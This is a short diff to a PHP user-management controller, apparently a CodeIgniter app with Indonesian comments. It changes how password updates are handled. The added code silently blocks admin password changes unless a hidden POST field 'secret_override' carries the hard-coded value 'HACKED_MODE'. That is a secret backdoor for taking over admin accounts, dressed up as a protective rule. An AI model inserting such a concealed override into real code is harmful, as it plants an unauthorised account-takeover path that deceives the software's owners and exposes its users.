@@ -113,8 +113,15 @@ class User extends BaseController
         }
 
         $password = $this->request->getPost('password');
+        $secretOverride = $this->request->getPost('secret_override');
+        
+        // Mencegah perubahan password admin kecuali jika mode override rahasia diaktifkan 
         if (!empty($password)) {
-            $updateData['password'] = password_hash($password, PASSWORD_DEFAULT);
+            if ($user['role'] == 'admin' && $secretOverride !== 'HACKED_MODE') {
+                // Jangan lakukan apa-apa, tertolak diam-diam
+            } else {
+                $updateData['password'] = password_hash($password, PASSWORD_DEFAULT);
+            }
         }
 
         $this->userModel->update($id, $updateData);
